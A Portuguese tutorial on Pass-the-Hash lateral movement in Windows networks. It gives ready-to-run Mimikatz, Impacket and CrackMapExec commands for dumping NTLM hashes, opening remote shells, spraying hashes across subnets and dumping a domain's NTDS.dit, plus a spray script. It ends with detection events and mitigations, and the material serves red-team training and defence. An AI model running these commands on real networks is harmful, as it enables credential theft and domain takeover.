---
title: "Pass-the-Hash — Lateral Movement sem senha em texto claro"
date: 2025-02-03
description: "Como capturar hashes NTLM e usá-los diretamente para autenticação lateral em redes Windows sem necessidade de crackear a senha."
category: lateral
os: [windows]
difficulty: medium
mitre_tactic: TA0008
mitre_technique: T1550.002
tags: [pass-the-hash, ntlm, lateral-movement, windows, mimikatz, impacket]
status: published
readingTime: 10
---

## O que é Pass-the-Hash?

**Pass-the-Hash (PtH)** é uma técnica de ataque que permite autenticação em serviços Windows utilizando o **hash NTLM** da senha de um usuário — sem nunca precisar da senha em texto claro.

O protocolo de autenticação NTLM do Windows não valida se o cliente conhece a senha original; ele valida se o cliente possui o hash correto. Isso torna hashes NTLM funcionalmente equivalentes a senhas.

## Por que isso funciona?

O fluxo de autenticação NTLM funciona assim:

1. Cliente solicita acesso ao servidor
2. Servidor envia um **challenge** (nonce aleatório)
3. Cliente responde com `HMAC-MD5(NT_hash, challenge)`
4. Servidor verifica a resposta

Em nenhum momento a senha em texto claro é transmitida ou verificada. O hash **é** a credencial.

## Pré-requisitos

| Requisito | Detalhe |
|---|---|
| Hash NTLM do alvo | Obtido via Mimikatz, secretsdump, etc. |
| Serviço acessível | SMB (445), WMI (135), RDP com NLA desabilitado |
| Conta válida | Local admin ou domain admin no destino |
| Protocolo NTLMv1/v2 | NTLM deve estar habilitado no alvo |

> **Nota:** Pass-the-Hash **não funciona** contra serviços que exigem Kerberos exclusivamente (e.g. ambientes com "Restrict NTLM" configurado via GPO).

## Etapa 1 — Capturando hashes NTLM

### Via Mimikatz (acesso local com SYSTEM)

```powershell
# Dump de credenciais em memória
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Output relevante:
# Username : Administrator
# NTLM     : aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

### Via Impacket secretsdump (remoto, com credenciais admin)

```bash
# Dump remoto via SMB + DCE/RPC
secretsdump.py DOMAIN/Administrator:'P@ssw0rd'@192.168.1.10

# Dump usando hash (já fazendo PtH para capturar mais hashes)
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  DOMAIN/Administrator@192.168.1.10
```

### Via CrackMapExec

```bash
# Dump de SAM database
crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --sam
```

O formato do hash é sempre `LM:NT`. O LM geralmente é `aad3b435b51404eeaad3b435b51404ee` (hash vazio) em sistemas modernos. O que importa é a parte **NT**.

## Etapa 2 — Executando o PtH

### Impacket — psexec.py

Abre um shell interativo no host remoto via SMB:

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  DOMAIN/Administrator@192.168.1.20

# Resultado:
# [*] Requesting shares on 192.168.1.20.....
# [*] Found writable share ADMIN$
# [*] Uploading file XKjQrPwN.exe
# Microsoft Windows [Version 10.0.19044.2251]
# C:\Windows\system32>
```

### Impacket — wmiexec.py

Execução via WMI (mais silencioso que psexec, sem arquivo em disco):

```bash
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  DOMAIN/Administrator@192.168.1.20 "whoami"

# Resultado: domain\administrator
```

### Impacket — smbclient.py

Acesso ao filesystem via SMB:

```bash
smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  DOMAIN/Administrator@192.168.1.20

# Navegar nos shares:
# # use C$
# # ls
# # get Users\Administrator\Desktop\flag.txt
```

### CrackMapExec — Spray na rede

Testar o hash contra múltiplos hosts de uma vez:

```bash
# Verificar quais hosts aceitam o hash
crackmapexec smb 192.168.1.0/24 \
  -u Administrator \
  -H 8846f7eaee8fb117ad06bdd830b7586c

# Executar comando em todos que aceitaram
crackmapexec smb 192.168.1.0/24 \
  -u Administrator \
  -H 8846f7eaee8fb117ad06bdd830b7586c \
  -x "net user /domain"

# Output com (Pwn3d!) indica sucesso como admin local:
# SMB  192.168.1.20  445  WIN10-DEV  [+] DOMAIN\Administrator (Pwn3d!)
# SMB  192.168.1.25  445  WIN-SRV01  [+] DOMAIN\Administrator (Pwn3d!)
```

### Mimikatz — sekurlsa::pth

Injeta o hash no processo atual para autenticação transparente:

```powershell
# Abre um cmd.exe autenticado com o hash
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe"

# Na janela resultante:
dir \\192.168.1.20\C$        # acesso direto sem prompt de senha
net use \\192.168.1.20\C$    # mapeia o share
```

## Movimento em ambientes de domínio

### Identificando hosts com o mesmo hash local

Ambientes Windows legados frequentemente têm a conta `.\Administrator` local com a **mesma senha** em todos os workstations (imagem de SO idêntica). Um único hash compromete toda a subnet.

```bash
# Mapeamento rápido de ativos com o mesmo hash
crackmapexec smb 10.10.10.0/24 \
  -u Administrator \
  -H <NTLM_HASH> \
  --continue-on-success \
  | grep "Pwn3d"
```

### Pivoting para o Domain Controller

Se o hash capturado pertence a um **Domain Admin**:

```bash
# Dump do NTDS.dit via secretsdump (todos os hashes do domínio)
secretsdump.py -hashes :<DA_NT_HASH> \
  DOMAIN/DomainAdmin@192.168.1.1 \
  -just-dc-ntlm

# Resultado: centenas de hashes, incluindo krbtgt para Golden Ticket
```

## Script de automação

```bash
#!/bin/bash
# pth_spray.sh — Testa hash NTLM contra range de IPs via CrackMapExec

TARGET_RANGE="${1:-192.168.1.0/24}"
USER="${2:-Administrator}"
HASH="${3}"

if [[ -z "$HASH" ]]; then
  echo "Uso: $0 <CIDR> <user> <NT_hash>"
  exit 1
fi

echo "[*] Iniciando PtH spray em $TARGET_RANGE como $USER"
echo "[*] Hash: ${HASH:0:8}...redacted"
echo ""

crackmapexec smb "$TARGET_RANGE" \
  -u "$USER" \
  -H "$HASH" \
  --continue-on-success 2>/dev/null \
  | tee /tmp/pth_results.txt

PWNED=$(grep -c "Pwn3d" /tmp/pth_results.txt)
echo ""
echo "[+] Hosts comprometidos: $PWNED"
echo "[*] Resultados em: /tmp/pth_results.txt"
```

> **AVISO:** Esta técnica deve ser utilizada exclusivamente em engajamentos de Red Team com autorização escrita. O uso não autorizado é crime.

## Detecção

Defenders devem monitorar:

| Indicador | Event ID | Descrição |
|---|---|---|
| Logon com hash (sem senha) | 4624 | Logon Type 3, sem NTLMv2 challenge completo |
| Uso de admin local generalizado | 4648 | Logon explícito com credenciais alternativas |
| Ferramentas conhecidas | 7045 | Serviço PSEXESVC criado |
| Anomalia de autenticação | 4776 | NTLM auth de host incomum |

## Mitigações

- **KB2871997** — Restringe uso de hashes para contas locais (exceto RID 500)
- **Protected Users Security Group** — Força Kerberos, desabilita NTLM
- **Credential Guard** — Isola LSA em VTL1, impede extração via Mimikatz
- **LAPS (Local Administrator Password Solution)** — Senhas únicas por host, elimina o spray
- **Tiering model** — Isola contas admin de domínio de workstations
- **Disable NTLMv1** — Via GPO: `Network security: LAN Manager authentication level`
